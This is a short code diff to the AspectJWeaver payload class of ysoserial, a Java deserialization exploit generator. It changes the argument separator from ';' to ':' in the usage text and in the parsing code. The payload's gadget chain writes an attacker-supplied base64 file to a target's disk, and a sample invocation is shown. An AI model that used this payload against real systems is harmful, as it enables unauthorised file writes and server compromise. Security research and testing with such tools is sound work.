@@ -31,9 +31,9 @@ HashSet.readObject()
                                 FileOutputStream.write()
 
 Usage:
-args = "<filename>;<base64 content>"
+args = "<filename>:<base64 content>"
 Example:
-java -jar ysoserial.jar AspectJWeaver "ahi.txt;YWhpaGloaQ=="
+java -jar ysoserial.jar AspectJWeaver "ahi.txt:YWhpaGloaQ=="
 
 More information:
 https://medium.com/nightst0rm/t%C3%B4i-%C4%91%C3%A3-chi%E1%BA%BFm-quy%E1%BB%81n-%C4%91i%E1%BB%81u-khi%E1%BB%83n-c%E1%BB%A7a-r%E1%BA%A5t-nhi%E1%BB%81u-trang-web-nh%C6%B0-th%E1%BA%BF-n%C3%A0o-61efdf4a03f5
@@ -46,11 +46,11 @@ https://medium.com/nightst0rm/t%C3%B4i-%C4%91%C3%A3-chi%E1%BA%BFm-quy%E1%BB%81n-
 public class AspectJWeaver implements ObjectPayload<Serializable> {
 
     public Serializable getObject(final String command) throws Exception {
-        int sep = command.lastIndexOf(';');
+        int sep = command.lastIndexOf(':');
         if ( sep < 0 ) {
             throw new IllegalArgumentException("Command format is: <filename>:<base64 Object>");
         }
-        String[] parts = command.split(";");
+        String[] parts = command.split(":");
         String filename = parts[0];
         byte[] content = Base64.decodeBase64(parts[1]);
 
